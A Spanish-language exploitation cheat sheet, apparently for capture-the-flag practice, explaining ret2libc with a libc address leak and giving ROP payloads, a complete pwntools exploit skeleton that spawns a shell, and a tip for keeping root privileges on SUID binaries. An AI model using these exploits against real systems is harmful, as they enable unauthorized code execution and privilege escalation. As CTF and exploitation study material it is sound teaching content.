# ret2libc con leak (cheat sheet)

Binario dinamico con NX+ASLR, sin funcion win. Objetivo: llamar system('/bin/sh') en libc.
Como ASLR aleatoriza libc, primero hay que FUGAR una direccion de libc, calcular la base, y
luego construir la llamada final.

## Cuando aplica
- checksec: NX enabled, no PIE (o PIE con leak aparte), Partial RELRO ok. Overflow de stack
  con offset conocido. Sin funcion gift. Binario enlaza libc (puts/printf/gets presentes).

## Fase 1: leak de libc (ret2plt)
Imprime la direccion real de una funcion ya resuelta en la GOT, usando puts del propio binario:
```
payload  = b"A"*offset
payload += p64(pop_rdi)          # gadget: pop rdi ; ret
payload += p64(elf.got['puts'])  # arg1 = &puts@GOT (direccion a imprimir)
payload += p64(elf.plt['puts'])  # llama a puts(puts@GOT) -> imprime la direccion real
payload += p64(elf.sym['main'])  # vuelve a main para una segunda ronda de input
```
Requisitos: que el binario haga flush (setvbuf sin buffer o \n) para ver el leak antes de
bloquear, y volver a un punto que relea input (main/vuln).
```
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym['puts']      # base de libc resuelta
```

## Fase 2: shell
Segundo payload con la base de libc ya conocida:
```
binsh  = next(libc.search(b"/bin/sh\x00"))
system = libc.sym['system']
payload  = b"A"*offset
payload += p64(pop_rdi) + p64(binsh)
payload += p64(ret)                 # alineacion de 16 bytes (movaps)
payload += p64(system)              # system("/bin/sh")
io.sendline(payload); io.interactive()
```

## Alineacion de stack (movaps)
system/printf usan instrucciones SSE (movaps) que exigen rsp%16==0 en la llamada. Si crashea
DENTRO de system con SIGSEGV en un movaps, inserta un gadget `ret` extra antes de system para
desplazar 8 bytes y realinear.

## one_gadget (alternativa a system)
`one_gadget ./libc.so.6` da direcciones magicas que hacen execve('/bin/sh') si se cumplen
constraints (p.ej. [rsp+0x40]==NULL). one = libc.address + off. Util cuando controlar rdi es
dificil o cuando el pop_rdi no existe. Prueba varias; a veces ninguna cumple los constraints.

## Sin pop rdi util
- ret2csu para controlar rdi/rsi/rdx (ver [[advanced-rop]]).
- gadgets dentro de libc (mov rdi, rax ; call ...) tras el leak.

## Identificar la libc remota (no te la dan)
Fuga 2-3 simbolos (puts, printf...) y busca en https://libc.rip o libc-database:
`./find puts <leak_lsb3> printf <leak_lsb3>`. Luego usa pwninit para parchear el binario con
esa libc + su loader y depurar en local con las MISMAS offsets.

## Gotchas
- El leak de puts termina sin los 2 bytes altos (0x00): rellena con ljust(8,b"\x00").
- Verifica el offset con cyclic/cyclic_find, no lo asumas.
- setuid: en binarios SUID anade setuid(0) antes de system para no perder privilegios.
- Si el remoto usa otra libc que la local, TODO offset cambia: identifica la libc primero.

## Esqueleto pwntools completo
```
from pwn import *
elf  = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')
io = process(elf.path)              # o remote(host, port)
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi','ret'])[0]
RET     = rop.find_gadget(['ret'])[0]
off = 72
io.sendlineafter(b'? ', flat({off:[POP_RDI, elf.got.puts, elf.plt.puts, elf.sym.main]}))
libc.address = u64(io.recvline().strip().ljust(8,b'\0')) - libc.sym.puts
log.info('libc base %#x', libc.address)
io.sendlineafter(b'? ', flat({off:[POP_RDI, next(libc.search(b'/bin/sh')), RET, libc.sym.system]}))
io.interactive()
```
